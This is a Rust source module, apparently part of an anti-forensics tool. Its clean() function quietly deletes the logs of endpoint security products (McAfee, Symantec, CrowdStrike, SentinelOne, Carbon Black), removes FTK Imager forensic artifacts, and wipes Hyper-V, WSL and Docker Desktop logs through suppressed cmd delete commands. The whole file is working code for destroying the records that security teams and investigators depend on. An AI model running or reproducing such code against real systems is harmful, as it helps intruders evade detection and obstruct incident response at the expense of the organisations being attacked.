use crate::logger::Logger;
use anyhow::Result;
use std::process::Command;

pub fn clean(logger: &Logger, dry_run: bool, _wipe: bool) -> Result<(usize, usize)> {
    logger.info("Cleaning security product artifacts...");
    let mut cleaned = 0;

    let targets = [
        (r"C:\ProgramData\McAfee\Endpoint Security\Logs\*", "McAfee logs"),
        (
            r"C:\ProgramData\Symantec\Symantec Endpoint Protection\CurrentVersion\Data\Logs\*",
            "Symantec Endpoint Protection logs",
        ),
        (r"C:\ProgramData\CrowdStrike\Logs\*", "CrowdStrike Falcon logs"),
        (r"C:\ProgramData\Sentinel\Logs\*", "SentinelOne logs"),
        (r"C:\ProgramData\CarbonBlack\Logs\*", "Carbon Black logs"),
    ];

    for (path, name) in &targets {
        if !dry_run {
            let _ = Command::new("cmd")
                .args(&["/c", &format!("del /q \"{}\" 2>nul", path)])
                .output();
            cleaned += 1;
            logger.verbose(&format!("Cleaned {}", name));
        }
    }

    // FTK Imager
    if !dry_run {
        let ftk = format!(
            r"{}\AccessData\FTK Imager\*",
            std::env::var("APPDATA").unwrap_or_default()
        );
        let _ = Command::new("cmd")
            .args(&["/c", &format!("rd /s /q \"{}\" 2>nul", ftk)])
            .output();
        cleaned += 1;
        logger.verbose("Cleaned FTK Imager artifacts");
    }

    // Hyper-V
    if !dry_run {
        let hv = r"C:\ProgramData\Microsoft\Windows\Hyper-V\Virtual Machines logs\*";
        let _ = Command::new("cmd")
            .args(&["/c", &format!("del /q \"{}\" 2>nul", hv)])
            .output();
        cleaned += 1;
        logger.verbose("Cleaned Hyper-V logs");
    }

    // WSL
    if !dry_run {
        let wsl = format!(
            r"{}\Packages\CanonicalGroupLimited.Ubuntu_*\LocalState\*.log",
            std::env::var("LOCALAPPDATA").unwrap_or_default()
        );
        let _ = Command::new("cmd")
            .args(&["/c", &format!("del /q \"{}\" 2>nul", wsl)])
            .output();
        cleaned += 1;
        logger.verbose("Cleaned WSL logs");
    }

    // Docker Desktop
    if !dry_run {
        let docker = format!(
            r"{}\Docker\log\*",
            std::env::var("APPDATA").unwrap_or_default()
        );
        let _ = Command::new("cmd")
            .args(&["/c", &format!("del /q \"{}\" 2>nul", docker)])
            .output();
        cleaned += 1;
        logger.verbose("Cleaned Docker Desktop logs");
    }

    logger.success(&format!(
        "Security product artifacts cleaned ({} items)",
        cleaned
    ));
    Ok((cleaned, 0))
}
